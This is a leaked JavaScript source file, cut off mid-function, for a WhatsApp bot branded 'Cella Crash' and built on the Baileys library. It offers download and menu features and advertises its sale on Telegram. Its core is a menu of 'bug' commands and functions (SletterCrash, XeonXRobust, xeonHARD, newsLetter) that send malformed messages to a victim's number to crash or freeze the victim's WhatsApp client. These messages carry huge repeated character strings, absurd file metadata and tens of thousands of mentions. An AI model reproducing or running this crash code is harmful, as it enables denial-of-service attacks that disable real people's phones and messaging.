/* 
==================================================================== |
 [ # ] Script Private CellaHug
 [ × ] SC LEAKED BY PRINCE
 [ @ ] JOIN CH t.me/princehomemade
   ☎️BULLSHIT > t.me/celasta 
=================================================================== |
*/

require("./settings/cfg")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const cheerio = require('cheerio')
const speed = require('performance-now')
const os = require('os')
const JsConfuser = require('js-confuser')
const path = require('path')
const archiver = require('archiver')
const timestampp = speed();
const latensi = speed() - timestampp
const { deobfuscate } = require('obfuscator-io-deobfuscator');
 const G2 = fs.readFileSync('./cella2.mp4')
const { smsg, RsZ, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom, formatp } = require('./serverside/libary/myfunc')
const { spotifyDown } = require('./serverside/libary/spotify')
const prem = require("./serverside/libary/premium");
const { ytdl } = require('./serverside/libary/ytdl');
let premium = JSON.parse(fs.readFileSync('./serverside/system/premium.json'));

module.exports = async (CellaBot, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""


const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (CellaBot.user.id.split(':')[0]+'@s.whatsapp.net' || CellaBot.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await CellaBot.decodeJid(CellaBot.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''

const groupMetadata = m.isGroup ? await CellaBot.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false


// Database path
let linkRegex = /https:\/\/open\.spotify\.com\/track\/[0-9A-Za-z]+/i;


// Console message
if (m.message) {

    console.log(`

${chalk.inverse(' 📬 MESSAGE RECEIVED ')}  ${chalk.inverse(` ${new Date().toLocaleString()} `)}

${chalk.magenta.bold('╭─ > From:')}      ${chalk.green.bold(pushname || 'Unknown')} ${chalk.yellow(`(${m.sender})`)}

${chalk.magenta.bold('├─ > In:')}        ${chalk.cyan.bold(m.isGroup ? 'Group Chat' : 'Private Chat')} ${chalk.gray(from)}

${chalk.magenta.bold('╰─ > Message:')}   ${chalk.white.bold(budy || m.mtype)}

${chalk.greenBright.bold('╭────────────────────────────────────────────╮')}

${chalk.greenBright.bold('│     Cella - V3              │')}

${chalk.greenBright.bold('╰────────────────────────────────────────────╯')}

    `);

}


// Self & public
if (!CellaBot.public) {
if (!m.key.fromMe) return
} 
//function tiktok
async function tiktok(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const encodedParams = new URLSearchParams();
      encodedParams.set("url", query);
      encodedParams.set("hd", "1");

      const response = await axios({
        method: "POST",
        url: "https://tikwm.com/api/", // Pastikan API endpoint ini valid
        headers: {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "Cookie": "current_language=en", // Header cookie opsional untuk API
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        },
        data: encodedParams,
      });

      const videos = response.data.data;
      const result = {
        title: videos.title,
        cover: videos.cover,
        origin_cover: videos.origin_cover,
        no_watermark: videos.play,
        watermark: videos.wmplay,
        music: videos.music,
      };
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
// Function Sinkron
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
  }

// Database //

    
    
// Variable 

const fkontak = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": 'Cella Bot Bug',
                    "jpegThumbnail": ''
                          }
                        }
                      }


const totalFitur = () =>{
            var mytext = fs.readFileSync("./CellaBot.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        // The Thumb //
        
const C1 = fs.readFileSync('./settings/CellaThumb.jpg')
const C2 = fs.readFileSync('./settings/CellaThM.jpg')
const CRandom = [C1, C2]
let CFeature = Math.floor(Math.random() * CRandom.length)
const RC = CRandom[CFeature]


//function loading
async function loadingl() {
    var arr = [
        "🌑",
         "🌘",
          "🌗",
           "🌖",
            "🌕",
             "🌖",
              "🌗",
               "🌘",
                "🐣"
    ];
    let load = await CellaBot.sendMessage(from, {text: '🐣'}, {quoted: m});
    for (let i = 0; i < arr.length; i++) {
        await sleep(100);
        await CellaBot.sendMessage(from, {text: arr[i], edit: load.key}, {quoted: m});
    }
}

async function loading() {
    var arr = [
        `${pushname}: *${command}*`,
        "...",
        "\`</>loading suksess✓</>\`"
    ];
    let load = await CellaBot.sendMessage(from, {text: 'loading..'}, {quoted: m});
    for (let i = 0; i < arr.length; i++) {
        await sleep(100);
        await CellaBot.sendMessage(from, {text: arr[i], edit: load.key}, {quoted: m});
    }
}

     // The Replyment //
const reply = async (teks) => {
return CellaBot.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: false,
title: `Made by Cella`,
body: `🔴 Active For ${runtime(process.uptime())}`,
previewType: "VIDEO",
thumbnail: RC,
sourceUrl: `t.me/nangis10hari`,
mediaUrl: `https://files.catbox.moe/zwi598.jpg`
}
},
text: teks
}, {
quoted: m
})
}

switch(command) {
    case "buttonmenu": {
          let NyM = await prepareWAMessageMedia({ image: fs.readFileSync('./settings/CellaThumb.jpg') }, { upload: CellaBot.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "Cella-Bug\n© Cell"
}), 
contextInfo: {
isForwarded: true,
forwardingScore: 9999
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
⧎  〈 *Cella Crash* 〉

Owner:Cella
Devoloper:CellaCantik
NameBot:CellaBug
Version:3.5.0


⧎  〈 *ANDRO MENU* 〉  ⧎
│ .hardbug \`<number>\` 
│ .mediumbug \`<number\` 
│ .cellafreeze \`<number>\` 
│ .cellacrash \`<number>\` 
│ .killsystemui \`<number>\`
│ .blankwhatsapp \`<number>\`
│ .combobug \`<number>\`
│ .locationbug \`<number>\`
│ .documentbug \`<number>\`
│ .byypas \`<number>\`
│ .pushkontak \`only group\`
╰──────────────━

⧎  〈 *BUG IPHONE* 〉  ⧎
│ .lockios \`<IPHONE>\`
│ .iphonecrasherr \`<IPHONE>\`
│ .killacces \`<number>\`
╰──────────────━

⧎  〈 *EMOJI VIRUS* 〉  ⧎
│ .😈 \`<number>\`
│ .🦅 \`<number>\`
│ .🔥 \`<number>\`
╰──────────────━
 `,
hasMediaAttachment: true,
...NyM
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/cellasta\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
⧎  〈 *TOOLSMENU* 〉  ⧎
│ .encrypt \`reply\`
│ .encrypthard \`reply\`
│ .decrypt \`reply\`
│ .play \`judul\`
│ .ai \`AI\`
│ .rvo \`reply\`
│ .pin \`pin gojo\`
│ .tiktok \`url\`
│ .sad 1-35 \`audio\`
╰──────────────━
`, 
hasMediaAttachment: true,
...NyM
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/cellasta\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
⧎  〈 *APASIH* 〉  ⧎
│ .clearbugs \`number\`
│ .pairing \`number\`
╰──────────────━
`, 
hasMediaAttachment: true,
...NyM
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/cellasta\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
  ⧎  〈 𝗖𝗿𝗲𝗱𝗶𝘁 𝗦𝗰𝗿𝗶𝗽𝘁 〉  ⧎
> Anggazyy
> Xin
> Rey
> DG Xeon
`, 
hasMediaAttachment: true,
...NyM
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/cellasta\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: m})
await CellaBot.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break
case "menux": {
	let mgmenu = await prepareWAMessageMedia({ image: RC }, { upload: CellaBot.waUploadToServer })
	const msgii = await generateWAMessageFromContent(m.chat, {
	viewOnceMessageV2Extension: {
	message: {
	messageContextInfo: {
	deviceListMetadata: {},
	deviceListMetadataVersion: 2
	}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
	body: proto.Message.InteractiveMessage.Body.fromObject({
	text: " Cella-Bug "
	}),
	carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
	cards: [{
	body: proto.Message.InteractiveMessage.Body.fromObject({
				  }),
				  footer: proto.Message.InteractiveMessage.Footer.fromObject({
				  }),
				  header: proto.Message.InteractiveMessage.Header.fromObject({
					title: ` Ola👋 ${pushname}! ,Welcome To \`Cellabot\` Created By *Cella* We Will Serve You Whenever You Need
    
▢ 𝖢𝗋𝖾𝖺𝗍𝗈𝗋 : *Cella*
▢ 𝖡𝗈𝗍𝗇𝖺𝗆𝖾 : *Cella*
▢ Hii : ${pushname}
▢ 𝖳𝗒𝗉𝖾 : 𝗖𝗮𝘀𝗲
▢ 𝖯𝗋𝖾𝖿𝗂𝗑 : 𝗠𝘂𝗹𝘁𝗶
▢ Active : *${runtime(process.uptime())}*

• \`( M E N U )\`
> buttonmenu

*DEV : t.me/cellasta* `,
					hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: RC }, { upload: CellaBot.waUploadToServer }))
				  }),
	nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
	buttons: [{
	"name": "single_select",
    "buttonParamsJson": `{\"title\":\"⧼ Display Menu ⧽ \",\"sections\":[{\"title\":\"© t.me/cellasta\",\"highlight_label\":\"\",\"rows\":[{\"header\":\"⧼ Button Menu ⧽\",\"title\":\"Click To Display All Menu\",\"description\":\"© t.me/cellasta\",\"id\":\".buttonmenu\"}]}]}`
	},
    {
    "name": "cta_url",
	"buttonParamsJson": `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/cellasta\",\"merchant_url\":\"https://www.google.com\"}`
	}]
	})
	}
	]
	})
	})}
	}}, {userJid: m.sender, quoted: m})
	await CellaBot.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
	}
	break
case "bugmenu":
const tek = `
⧎  〈 *Cella Crash* 〉

Owner:Cella
Devoloper:CellaCantik
NameBot:CellaBug
Version:3.0.0


⧎  〈 *WARMENU* 〉  ⧎
│ .hardbug \`<number>\` 
│ .mediumbug \`<number\` 
│ .cellafreeze \`<number>\` 
│ .cellacrash \`<number>\` 
│ .killsystemui \`<number>\`
│ .blankwhatsapp \`<number>\`
│ .combobug \`<number>\`
│ .locationbug \`<number>\`
│ .documentbug \`<number>\`
│ .byypas \`<number>\`
│ .pushkontak \`only group\`
╰──────────────━

⧎  〈 *BUG IPHONE* 〉  ⧎
│ .lockios \`<IPHONE>\`
│ .iphonecrasherr \`<IPHONE>\`
│ .killacces \`<number>\`
╰──────────────━

⧎  〈 *EMOJI VIRUS* 〉  ⧎
│ .😈 <number>
│ .🦅 <number>
│ .🔥 <number>
╰──────────────━
    `;


    await CellaBot.sendMessage(m.chat, {
        video: G2,
        gifPlayback: true,
        caption: tek,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: 'CellaV3',
                body: 'Simple WhatsApp Bot © Cella.',
                thumbnailUrl: 'https://cdn.elxyzgpt.xyz/file/qQxoKGvLt0.png',
                sourceUrl: '-',
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: fkontak });

    // Memuat dan mengirim audio langsung
    try {
        const audioPath = './settings/petax2.mp3';
        if (fs.existsSync(audioPath)) {
            const audioBuffer = fs.readFileSync(audioPath);

            await CellaBot.sendMessage(m.chat, { 
                audio: audioBuffer, 
                mimetype: 'audio/mpeg', 
                ptt: true // Mengirim sebagai pesan suara
            }, { quoted: m });
        }
    } catch (error) {
        console.error("Terjadi kesalahan:", error);
    }
    break;
case "toolsmenu":
const teks = `
⧎  〈 *TOOLSMENU* 〉  ⧎
│ .encrypt \`reply\`
│ .encrypthard \`reply\`
│ .decrypt \`reply\`
│ .play \`judul\`
│ .ai \`AI\`
│ .rvo \`reply\`
│ .pin \`pin gojo\`
│ .tiktok \`url\`
│ .sad 1-35 \`audio\`
╰──────────────━
`;

    await CellaBot.sendMessage(m.chat, {
        video: G2,
        gifPlayback: true,
        caption: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: 'CellaV3',
                body: 'Simple WhatsApp Bot © Cella.',
                thumbnailUrl: 'https://cdn.elxyzgpt.xyz/file/qQxoKGvLt0.png',
                sourceUrl: '-',
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: fkontak });

    // Memuat dan mengirim audio langsung
    try {
        const audioPath = './settings/petax2.mp3';
        if (fs.existsSync(audioPath)) {
            const audioBuffer = fs.readFileSync(audioPath);

            await CellaBot.sendMessage(m.chat, { 
                audio: audioBuffer, 
                mimetype: 'audio/mpeg', 
                ptt: true // Mengirim sebagai pesan suara
            }, { quoted: m });
        }
    } catch (error) {
        console.error("Terjadi kesalahan:", error);
    }
    break;
case "udahan":
const tekk = `
「  ⛩️ *GK TAU* ⛩️ 」
│ .clearbugs \`number\`
│ .pairing \`number\`
╰──────────────━
`;

    await CellaBot.sendMessage(m.chat, {
        video: G2,
        gifPlayback: true,
        caption: tekk,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: 'CellaV3',
                body: 'Simple WhatsApp Bot © Cella.',
                thumbnailUrl: 'https://cdn.elxyzgpt.xyz/file/qQxoKGvLt0.png',
                sourceUrl: '-',
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: fkontak });

    // Memuat dan mengirim audio langsung
    try {
        const audioPath = './settings/petax2.mp3';
        if (fs.existsSync(audioPath)) {
            const audioBuffer = fs.readFileSync(audioPath);

            await CellaBot.sendMessage(m.chat, { 
                audio: audioBuffer, 
                mimetype: 'audio/mpeg', 
                ptt: true // Mengirim sebagai pesan suara
            }, { quoted: m });
        }
    } catch (error) {
        console.error("Terjadi kesalahan:", error);
    }
    break;
case "creadit":
const tekkk = `
⧎  〈 𝗖𝗿𝗲𝗱𝗶𝘁 𝗦𝗰𝗿𝗶𝗽𝘁 〉  ⧎
> Anggazyy
> Xin
> Rey
> DG Xeon
`;

    await CellaBot.sendMessage(m.chat, {
        video: G2,
        gifPlayback: true,
        caption: tekkk,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: 'CellaV3',
                body: 'Simple WhatsApp Bot © Cella.',
                thumbnailUrl: 'https://cdn.elxyzgpt.xyz/file/qQxoKGvLt0.png',
                sourceUrl: '-',
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: fkontak });

    // Memuat dan mengirim audio langsung
    try {
        const audioPath = './settings/petax2.mp3';
        if (fs.existsSync(audioPath)) {
            const audioBuffer = fs.readFileSync(audioPath);

            await CellaBot.sendMessage(m.chat, { 
                audio: audioBuffer, 
                mimetype: 'audio/mpeg', 
                ptt: true // Mengirim sebagai pesan suara
            }, { quoted: m });
        }
    } catch (error) {
        console.error("Terjadi kesalahan:", error);
    }
    break;
// The Bug Functions ! //
 // Ui Speciality //
async function newsLetter(zLoc, ptcp = true) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await CellaBot.relayMessage(zLoc, ptcp, {
                    userJid: zLoc,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
async function SletterCrash(zLoc, ptcp = false) {
let virtex = "☆ CellaCrash" + "ꦾ".repeat(77777) + "@1".repeat(77777);
	var messageContent = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363321763581234@newsletter`,
							"newsletterName": virtex,
							"jpegThumbnail": "",
							"caption": virtex,
							"inviteExpiration": Date.now() + 1814400000
						},
						contextInfo: {
                  mentionedJid: ["6285805338638@s.whatsapp.net"],
                  groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
                    }
					}
				}
			}), {
				'userJid': zLoc
			});
			await CellaBot.relayMessage(zLoc, messageContent.message, {
				'participant': {
					'jid': zLoc
				},
				'messageId': messageContent.key.id
		});
            console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
}
   async function XeonXRobust(zLoc, ptcp = false) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await CellaBot.relayMessage(zLoc, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },

									body: { text: 'ᄃΛᄂIƧƬΛᄃЯΛƧΉ' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: zLoc
     }
    } : {}
   );
	}
  
     async function xeonHARD(zLoc, ptcp = false)
    {
          const gg = "ꦽ".repeat(10200);
          const ggg = "ꦿꦾ".repeat(10200);
          CellaBot.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: " '  ᄃΛᄂIƧƬΛᄃЯΛƧΉ'\n" + gg,
                  previewType: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                  contextInfo: {
                    mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await CellaBot.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "akujelek?"
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
